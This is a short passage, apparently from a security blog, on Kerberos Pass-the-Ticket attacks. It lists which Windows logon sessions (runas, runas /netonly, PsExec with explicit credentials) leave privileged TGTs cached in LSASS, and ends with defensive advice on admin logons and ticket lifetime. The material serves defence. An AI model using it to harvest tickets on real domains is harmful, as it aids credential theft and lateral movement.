This is a great resource on the types of Logon Types:

Types of Interactive Logon-Sessions

Local Login: Physically Logging in at Your Workstation

runas: Perhaps you are a Low Level Helpdesk who uses /runas to spawn a CMD with DA Account, this will result in a TGT for the DA account be cached in LSSAS

runas /netonly: TGT will appear after running a network command (\\IP\SYSVOL) or something

PsExec \\server -u user -p pwd cmd - PSExec leaves a TGT providing explicit credentials were defined
Types of Remote-Interactive Logon Sessions

Mitigation / Defending against PTT
It goes without saying that defending against PTT is very tricky as you are simply using normal functions of Kerberos in a malicious way - All you are really doing is using Kerberos tickets as they would be used, TGT to request service TGS Ticket, and accessing services with TGS.

However as tickets are stored in LSASS I recommend you do not log into end-users stations with privileged accounts i/e do not log into a HR User with your Domain Account with a interactive sessionâ€¦

It is also advised to ensure that Kerberos tickets are set to expire within 10 hours.
